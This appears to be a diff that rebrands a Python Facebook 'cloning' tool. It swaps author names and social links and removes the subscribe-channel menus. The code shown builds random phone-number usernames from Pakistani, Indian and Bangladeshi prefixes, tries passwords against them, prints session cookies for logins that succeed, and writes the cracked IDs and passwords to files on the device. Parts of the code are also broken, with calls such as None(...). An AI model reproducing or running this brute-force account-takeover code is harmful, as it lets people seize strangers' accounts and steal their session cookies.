@@ -15,32 +15,7 @@ class jalan:
         pass
 
 
-logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
-
-def ud():
-    os.system('clear')
-    jalan(logo)
-    print(' [1] SUBSCRIBE MY CHANNEL')
-    print(' [2] EXIT')
-    opt = input('\n   Choose option >>> ')
-    if opt == '1':
-        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
-        FD()
-        return None
-    None('\n\x1b[1;31mEXIT\x1b[0;97m')
-
-
-def FD():
-    os.system('clear')
-    print(logo)
-    print('\x1b[1;33m [1] SUBSCRIBE MY FRIEND CHANNEL')
-    print(' [2] EXIT')
-    opt = input('\n  \x1b[1;32m Choose option >>> ')
-    if opt == '1':
-        os.system('xdg-open https://youtu.be/y837qD_AO6Q')
-        o()
-        return None
-    None('\n\x1b[1;31mEXIT\x1b[0;97m')
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mTISHAN\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mTISHAN\x1b[0;m\x1b[1;32m && \x1b[1;33mTISHAN\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m TANJIM MAHFUZ\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-TISHAN\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS PAID\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mTIS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mTISHAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO TIS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mTT\x1b[0;m ======================\n'
 
 
 def o():
@@ -57,7 +32,7 @@ def o():
     if opt == '1':
         i()
     if None == '2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100082840689031')
+        os.system('xdg-open https://www.facebook.com/tanjim.tishan.900')
         return None
     if None == '3':
         os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
@@ -174,14 +149,14 @@ logo =                                          ("""
 \033[1;35m       888   Y88b  888  T88b  Y88b  d88P 
 \033[1;32m       888    Y88b 888   T88b  "Y8888P"  
  
-\033[1;37m================= \33[32;45mKASHIF\33[0;m =====================
+\033[1;37m================= \33[32;45mTISHAN\33[0;m =====================
 \033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mARYAN\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
 \033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ArYan KhAn
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-KRS
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35mKRS
 \033[1;32m     \033[1;36mTOOL VIRSION :  
-\033[1;37m================= \33[32;45mARYAN\33[0;m =====================
+\033[1;37m================= \33[32;45mTAMU\33[0;m =====================
  
        \33[37;41m\t WELLCOME TO KRS TOOL\33[0;m
  
@@ -253,13 +228,13 @@ def i():
     jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
     jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
     jalan('\033[1;32m============================================')
-    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
+    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m62040 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
     jalan('\033[1;32m============================================')
     jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
     jalan('\033[1;32m============================================\n')
     code = input(' PUT CODE : ')
     print("")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+    limit = int(input(' EXAMPLE: 2000, 3000, 5000, 100000\n\n PUT CLONING LIMIT: '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -335,7 +310,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(ARYAN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(TISHAN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/ARYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -343,14 +318,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(ARYAN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(TISHAN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[ARYAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[TISHAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
